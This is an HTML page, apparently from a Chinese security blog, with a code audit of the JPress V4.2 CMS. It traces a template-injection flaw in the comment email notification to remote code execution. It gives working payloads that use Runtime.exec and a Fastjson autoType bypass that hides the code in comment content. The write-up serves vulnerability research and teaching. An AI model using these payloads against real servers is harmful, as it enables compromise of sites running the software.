@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            jpress V4.2 代码审计 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">jpress V4.2 代码审计</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-11-06 11:23:45</span>
+        <span class="mobile">2022-11-06 11:23</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-11-14 16:59:38</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>4.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>17 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近做 CMS 审计的时候恰好碰到了这么一个框架，学习漏洞不光是要会打，还要明白原理，结合网站可知；是用 jpress V4.2 搭建的，来学习一手。（后面发现是 就press3.0，我是小丑</p>
+<p>jpress 类似于 WordPress Write in Java，和 PHP 的 WordPress 非常像。不过 Java 搭建环境会比 PHP 要复杂一些，当时我自己也是因为环境搭建的问题卡了很久（非常多的问题，不只是 maven，这一块踩坑的师傅可以滴滴我</p>
+<p>比起普通的 SpringBoot 搭建的 Java 环境相比，jpress 使用的 jBoot，和 SpringBoot 十分类似，不过看点其他架构写的项目也是比较有趣。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ul>
+<li>这个项目的环境搭建会有点烦躁</li>
+</ul>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress">https://github.com/JPressProjects/jpress</a></p>
+<p>去到 release 页面下，下载 v4.2 版本的，后续会对新版本当中的漏洞进行挖掘。</p>
+<p>下载完毕项目之后，先在项目界面输入命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn clean package<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此处比较坑，我遇到的问题是</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MavenError.png" class="">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Failed to execute goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar <span class="token punctuation">(</span>default-jar<span class="token punctuation">)</span> on project codegen: Execution default-jar of goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar failed: A required class was missing <span class="token keyword">while</span> executing org.apache.maven.plugins:maven-jar-plugin:2.4:jar: org/codehaus/plexus/components/io/resources/PlexusIoResourceCollection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将存储 maven 仓库的所有库都删掉即可，接着再执行命令即可。</p>
+<p>搭建完毕之后创建数据库，但不要导入文件，也不要修改任何配置，直接跑项目。</p>
+<p>项目跑起来之后会访问到 <a target="_blank" rel="noopener" href="http://localhost:8080/install">http://localhost:8080/install</a> 下</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/jpressInstall.png" class="">
+
+<p>按照要求完成安装之后，会让你配置一些网站信息。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/installStep3.png" class="">
+
+<p>至此，搭建完成！</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/InstallDown.png" class="">
+
+<p>在 undertow.txt 中可以修改端口</p>
+<h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><h3 id="代码审计准备"><a href="#代码审计准备" class="headerlink" title="代码审计准备"></a>代码审计准备</h3><h4 id="架构理解"><a href="#架构理解" class="headerlink" title="架构理解"></a>架构理解</h4><p>jpress 项目分为前台页面和后台管理界面，前台页面是纯前端的内容，所以漏洞点主要是在后台管理页面这里。</p>
+<p>在后台管理界面这里，需要在模板 —&gt; 所有模板中选择对应的模板，才能在前台页面看到一些漏洞的回显。比如 XXE，XSS 这些，在公司测试的时候没有注意到这一点，吃了些亏。</p>
+<h4 id="pom-xml-与-Filter-等审计"><a href="#pom-xml-与-Filter-等审计" class="headerlink" title="pom.xml 与 Filter 等审计"></a>pom.xml 与 Filter 等审计</h4><p>查看父项目的 pom.xml，发现用的都是最新版本的组件，理论上不存在组件漏洞。</p>
+<p>此项目中不存在 Filter，这就意味着很可能存在 SQL 注入或者是 XSS</p>
+<blockquote>
+<p>存在多 module，需要我们对不同 module 功能块进行审计，尽量从一个漏洞发现者的角度去看，这样还是可以学到很多的。</p>
+</blockquote>
+<h3 id="模板渲染引起的-RCE"><a href="#模板渲染引起的-RCE" class="headerlink" title="模板渲染引起的 RCE"></a>模板渲染引起的 RCE</h3><h4 id="影响接口"><a href="#影响接口" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>admin<span class="token operator">/</span>article<span class="token operator">/</span>setting
+<span class="token operator">/</span>admin<span class="token operator">/</span>page<span class="token operator">/</span>setting
+<span class="token operator">/</span>admin<span class="token operator">/</span>product<span class="token operator">/</span>setting
+<span class="token operator">/</span>admin<span class="token operator">/</span>template<span class="token operator">/</span>edit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>在 <code>setting</code> 目录下存在好几处的模板渲染漏洞</li>
+</ul>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>为什么想到这个漏洞呢？原因是在文章 ——&gt; 设置这里面的 “评论邮件通知管理员” 中；官方给出了例子，告诉我们可以用 <code>#(comment.id)</code>，那么猜测这里可能会存在模板渲染问题，此处对应的模板是 Velocity</p>
+<p>进去看与文章评论相关的类，找到是这一个 ———— <code>io.jpress.module.article.controller.front.ArticleController</code>，这里是有关于前台页面当中，对于文章的管理的一个类。我们在 <code>postComment()</code> 方法处下一个断点，这个方法的作用主要是将评论信息保存到数据库，同时还会发送短信通知网站管理员。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ArticleControllerPostComment.png" class="">
+
+<p>我们先开启文章评论的功能，如图</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/OpenFunctions.png" class="">
+
+<p>接着发布一条评论，来看一看它的运行流程。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CommentLie.png" class="">
+
+<p>前面是一系列的赋值与基础判断，有兴趣的师傅们可以自行调试看一下，属于是很简单的部分。直接看重点部分，第 268 行。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ArticleNotifyKit.png" class="">
+
+<p>跟进一下，进入到 <code>notify()</code> 方法，它这里面定义了两种将评论发送给管理员的方式，一种是 Email 的形式，另外一种是 Sms 的形式。我们先跟进 email 的看一下，这里会先判断是否开启了 <code>article_comment_email_notify_enable</code>，如果开启了则进入到 email 的形式当中。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EmailSuccessSend.png" class="">
+
+<p>跟进 <code>doSendEmail()</code> 方法，它去做了 SendEmail 这个动作的具体业务实现。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/doSendEmail.png" class="">
+
+<p><code>doSendEmail()</code> 方法前面都是一些基础赋值，到第 90 行看到了模板渲染操作，在第 90 和 91 行，分别对邮件的 emailTitle 和 emailTemplate 调用 <code>getTemplateByString()</code> 方法进行渲染，这两个变量对应 <code>#(comment.id)</code> 处的两个值。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/emailValue.png" class="">
+
+<ul>
+<li>而漏洞的触发点实际上是在同一行语句的 <code>renderToString()</code> 方法下。</li>
+</ul>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/renderToString.png" class="">
+
+<p>跟进 <code>render()</code> 方法</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/render.png" class="">
+
+<p>发现里面存在一个危险方法 <code>exec()</code>，跟进一下，在 <code>exec()</code> 方法当中对输入的评论进行遍历。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/exec.png" class="">
+
+<p>连续跟进一下，会到 <code>com.jfinal.template.expr.ast.Method</code> 这个类的 <code>eval()</code> 方法下，对应的调用栈如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">eval<span class="token operator">:</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token class-name">Method</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>
+assignVariable<span class="token operator">:</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token class-name">Assign</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>
+eval<span class="token operator">:</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token class-name">Assign</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>
+exec<span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token class-name">Set</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">.</span>stat<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>
+exec<span class="token operator">:</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token class-name">StatList</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">.</span>stat<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>
+render<span class="token operator">:</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token class-name">Template</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">)</span>
+renderToString<span class="token operator">:</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token class-name">Template</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>template<span class="token punctuation">)</span>
+doSendEmail<span class="token operator">:</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token class-name">ArticleNotifyKit</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>jpress<span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>article<span class="token punctuation">.</span>kit<span class="token punctuation">)</span>
+lambda$byEmail$<span class="token number">16</span><span class="token operator">:</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token class-name">ArticleNotifyKit</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>jpress<span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>article<span class="token punctuation">.</span>kit<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1607068801</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">io<span class="token punctuation">.</span>jpress<span class="token punctuation">.</span>module<span class="token punctuation">.</span>article<span class="token punctuation">.</span>kit<span class="token punctuation">.</span></span>ArticleNotifyKit</span>$$<span class="token class-name">Lambda</span>$<span class="token number">79</span><span class="token punctuation">)</span>
+runWorker<span class="token operator">:</span><span class="token number">1142</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">617</span><span class="token punctuation">,</span> <span class="token class-name">ThreadPoolExecutor</span>$<span class="token class-name">Worker</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">)</span>
+run<span class="token operator">:</span><span class="token number">745</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此处就可以很明显的看到存在反射调用任意类的命令执行漏洞</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MethodInvokeRCE.png" class="">
+
+<p>在 Velocity 这个模板引擎当中非常奇妙，先从模板引擎说起，师傅们都知道模板引擎有时候是可以写脚本的，可以进行一些简单的赋值与输出这类的操作。</p>
+<p>在 Velocity 中 <code>&quot;#&quot;</code> 用来标识 Velocity 的脚本语句，包括 <code>#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro</code> 等；  </p>
+<p>如：</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">#if($info.imgs) 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$info.imgs<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>0</span><span class="token punctuation">></span></span> 
+#else 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noPhoto.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+#end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么在这一个 PoC 当中，我们可以借助 Fastjson 的特性辅助攻击。</p>
+<ul>
+<li>构造 PoC 如下，并将它插入到评论的内容当中。</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token class-name"><span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>ehcache<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>ClassLoaderUtil</span><span class="token operator">::</span><span class="token function">createNewInstance</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>e<span class="token operator">=</span>x<span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilPayloadContent.png" class="">
+
+<p>按照道理来说，这里前台只要输入任意的东西，就可以造成 SSTI To RCE 这么一个效果，但是这里却抛出了异常，具体位置是在 <code>renderToString()</code> 方法调用之后抛出了异常，如图。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilThrowException.png" class="">
+
+<p>仔细看一下报错信息：其实是在说，第三行的地方存在着不合法的字符，这个字符其实是单引号。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ErrorInfoSSTI.png" class="">
+
+<p>所以这里我们需要用另外一种方式来打，尝试不使用引号构造 payload，构造出了如下 payload，我们将字符串内容通过评论内容进行传入</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>str<span class="token operator">=</span>comment<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span><span class="token operator">::</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token function">set</span><span class="token punctuation">(</span>sem<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>str<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">addAccept</span><span class="token punctuation">(</span>sem<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token function">set</span><span class="token punctuation">(</span>json<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>str<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>x<span class="token operator">=</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token operator">::</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>js<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>str<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>e<span class="token operator">=</span>x<span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为后端在渲染模板时将 comment 对象传入了，所以我们可以获取 <code>comment.content</code>，而这个值又是在评论时可控的，配合 Fastjson 打。</p>
+<p>在评论的地方构造 payload</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token operator">|</span><span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">&#125;</span><span class="token operator">|</span>js<span class="token operator">|</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BypassPayload.png" class="">
+
+<p>攻击成功！</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SSTIRceSuccess.png" class="">
+
